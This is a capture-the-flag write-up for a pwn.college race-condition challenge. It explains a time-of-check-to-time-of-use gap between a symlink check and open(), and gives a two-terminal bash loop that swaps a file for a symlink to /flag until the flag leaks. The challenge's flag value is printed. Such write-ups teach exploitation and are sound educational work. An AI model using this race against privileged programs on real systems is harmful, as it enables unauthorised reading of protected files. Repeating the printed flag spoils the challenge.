---
custom_edit_url: null
sidebar_position: 2
slug: /pwn-college/system-security/race-conditions
---

## babyrace_level1.0

> Read the flag file, but the program verifies the path doesn't contain "flag" and that the file is not a symlink.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0
###
### Welcome to /challenge/babyrace_level1.0!
###
This challenge allows you to open a single file, as specified by the first argument to the program (argv[1]).
The file opened will be sent to you.
This challenge will verify that the file's path does not include "flag".
This challenge will verify that the file is not a symlink.
babyrace_level1.0: <stdin>:47: main: Assertion `argc > 1' failed.
Aborted
```

The program performs two checks before opening the file:

1. The path must not contain the string `"flag"`.
2. The file at that path must not be a symlink (`lstat` → `S_ISLNK`).

After both checks pass, it opens the file and sends the contents to stdout.

### TOCTOU

The key insight is that these checks and the subsequent `open()` call are **not atomic**. There is a small window of time between the **check** (is it a symlink?) and the **use** (actually opening the file).

```
Timeline:
  Program:   [lstat check — NOT symlink ✓] ----gap---- [open() → reads file]
  Attacker:       ^real file here^          ^swap!^      ^symlink to /flag^
```

If we can swap a regular file for a symlink to `/flag` inside that window, the program will pass the check against the regular file but then open our symlink, leaking the real flag.

### Exploit

Terminal 1:

```bash
while true; do
    rm -f x
    echo hi > x
    rm -f x
    ln -s /flag x
done
```

Terminal 2:

```bash
while true; do
    /challenge/babyrace_level1.0 x
done
```

Eventually the program checks `x` when it is a normal file, then opens it after it has become a symlink to `/flag`, printing the flag.

```text
hacker@race-conditions~level1-0:~$ /challenge/babyrace_level1.0 x
pwn.college{rAc3C0nd1t10ns_TOCTOUl1v3s.0VMzIDL4ITM0EzW}
```

